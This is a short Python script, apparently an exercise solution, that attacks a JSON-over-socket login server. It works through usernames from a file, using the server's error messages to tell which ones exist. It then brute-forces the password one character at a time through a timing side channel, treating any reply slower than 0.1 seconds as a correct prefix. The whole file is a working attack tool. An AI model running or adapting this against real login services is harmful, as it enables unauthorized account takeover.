import socket
import sys
import json
from itertools import product, chain
from datetime import datetime


def generate_password():
    numbers = [chr(x) for x in range(ord('0'), ord('9') + 1)]
    letters = [chr(x) for x in range(ord('a'), ord('z') + 1)]
    upper_l = [chr(x) for x in range(ord('A'), ord('Z') + 1)]
    for i in product(chain(numbers, letters, upper_l), repeat=1):
        yield ''.join(i)


def send_message(s):
    message = json.dumps(s)
    client_socket.send(message.encode())
    response = client_socket.recv(1024)
    response = json.loads(response.decode())["result"]
    return response


def login_found(s):
    message = {"login": s, "password": ""}
    if send_message(message) in ["Exception happened during login", "Wrong password!"]:
        return True
    else:
        return False


def password_found(l):
    message = {"login": l}
    password = ""
    while True:
        generator = generate_password()
        for j in generator:
            message["password"] = password + j
            start = datetime.now()
            r = send_message(message)
            finish = datetime.now()
            if (finish - start).total_seconds() > 0.1:
                password += j
                break
            if r == "Connection success!":
                password += j
                return message
        else:
            return False
    return False


address = (sys.argv[1], int(sys.argv[2]))
with socket.socket() as client_socket:
    client_socket.connect(address)
    with open("logins.txt") as logins_file:
        for line in logins_file:
            login = line.strip()
            if login_found(login):
                break
        result = password_found(login)
        print(json.dumps(result))
